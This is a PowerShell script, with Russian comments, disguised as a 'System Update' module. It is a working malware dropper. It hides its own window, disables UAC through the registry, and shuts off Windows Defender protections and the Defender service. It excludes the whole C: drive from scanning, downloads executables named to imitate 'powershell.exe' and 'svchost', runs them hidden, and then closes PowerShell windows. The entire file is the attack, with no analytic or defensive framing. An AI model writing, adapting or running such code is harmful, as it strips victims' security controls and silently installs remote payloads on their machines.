# =============================================================================
#  ███████╗██╗  ██╗███████╗██╗     ██╗     ██████╗  █████╗  ██████╗
#  ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔══██╗██╔══██╗██╔════╝
#  ███████╗███████║█████╗  ██║     ██║     ██████╔╝███████║██║  ███╗
#  ╚════██║██╔══██║██╔══╝  ██║     ██║     ██╔══██╗██╔══██║██║   ██║
#  ███████║██║  ██║███████╗███████╗███████╗██████╔╝██║  ██║╚██████╔╝
#  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝
#                       SYSTEM UPDATE v3.0 | MODULE
# =============================================================================

# Сворачиваем текущее окно PowerShell в трей (скрыто)
$code = @'
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)
'@
$null = Start-Job -ScriptBlock ([scriptblock]::Create($code))

# Меняем заголовок окна (он всё равно скрыт, но пусть будет)
$Host.UI.RawUI.WindowTitle = "System Update"

# Функция асинхронной загрузки
function Download-File {
    param($url, $path)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url, $path)
        return $true
    } catch {
        return $false
    }
}

# Отключаем UAC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force

# Отключаем Defender (всё, что можно)
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
} catch { }

# Список URL для загрузки
$urls = @(
    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe",
    "https://github.com/sys1e/catl/raw/refs/heads/main/svchost1.exe"
)

$downloaded = @()

foreach ($url in $urls) {
    $fileName = $url.Split("/")[-1]
    $path = "$env:TEMP\$fileName"
    
    # Скачиваем
    $success = Download-File -url $url -path $path
    
    if ($success -and (Test-Path $path) -and ((Get-Item $path).Length -gt 0)) {
        $downloaded += $path
        # Добавляем в исключения Defender
        try { Add-MpPreference -ExclusionPath $path -Force -ErrorAction SilentlyContinue } catch { }
    }
}

# Запускаем скачанные файлы в фоне
foreach ($file in $downloaded) {
    try {
        Start-Process -FilePath $file -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch { }
}

# Небольшая пауза перед скрытием процессов (по желанию)
Start-Sleep -Seconds 2

# Полностью скрываем этот процесс PowerShell
try {
    $null = Start-Job -ScriptBlock {
        Start-Sleep -Seconds 1
        Get-Process -Name "powershell" -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() }
        exit
    }
} catch { }

# Выход без окон
Exit
